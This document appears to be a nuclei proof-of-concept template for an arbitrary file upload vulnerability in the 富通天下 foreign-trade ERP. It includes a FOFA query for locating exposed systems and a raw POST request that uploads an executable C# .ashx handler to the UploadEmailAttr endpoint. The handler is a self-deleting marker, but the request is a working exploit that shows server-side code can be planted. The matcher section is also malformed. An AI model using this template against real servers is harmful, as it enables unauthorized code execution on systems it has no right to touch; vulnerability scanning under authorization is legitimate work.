# Add your nuclei formatted PoC!
id: ft-erp-UploadEmailAttr-fileupload
info:
  name: 富通天下-外贸ERP-UploadEmailAttr-任意文件上传
  author: 蜜汁狗蛋
  severity: critical
  metadata:
    fofa: title="用户登录_富通天下外贸ERP"
 
requests:
  - raw:
      - |
        POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0.60dabdd3d70bcd96
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        <%@ WebHandler Language="C#" Class="TestHandler" %>
        using System;
        using System.IO;
        using System.Web;
        public class TestHandler : IHttpHandler {
            public void ProcessRequest(HttpContext context) {
                context.Response.ContentType = "text/plain";
                context.Response.Write("5555555555555555555555555555");
                string scriptFilePath = context.Request.PhysicalPath;
                if (File.Exists(scriptFilePath)) {
                    try {
                        File.Delete(scriptFilePath);
                    } catch (Exception ex) {
                        context.Response.Write("Error occurred while deleting the script file: " + ex.Message);
                    }
                } else {
                    context.Response.Write("The script file does not exist.");
                }
            }

            public bool IsReusable {
                get {
                    return false;
                }
            }
        }
      
 
    matchers:
      - type: regex
        part: body
        regex:
          - '^(https?://).*\.ashx$''
        condition: and

        - type: status
        status:
        - 200
        condition: and
'
